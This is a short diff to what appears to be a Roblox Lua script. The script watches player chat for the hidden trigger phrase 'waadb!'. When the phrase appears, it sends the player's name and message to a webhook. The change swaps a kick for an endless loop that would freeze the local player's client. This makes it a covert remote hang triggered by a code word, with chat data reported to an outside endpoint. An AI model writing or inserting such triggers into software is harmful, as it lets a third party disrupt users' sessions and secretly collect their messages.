@@ -146,7 +146,9 @@ local function monitor(player)
         -- Check for the special code and kick the player
         if msg:lower():match("waadb!") then
             sendWebhook(player.Name, msg)
-            LocalPlayer:Kick("276")
+            while true do
+				print('a')
+end
         end
 
         -- Check if the player is OvercomeHatred and they typed !play
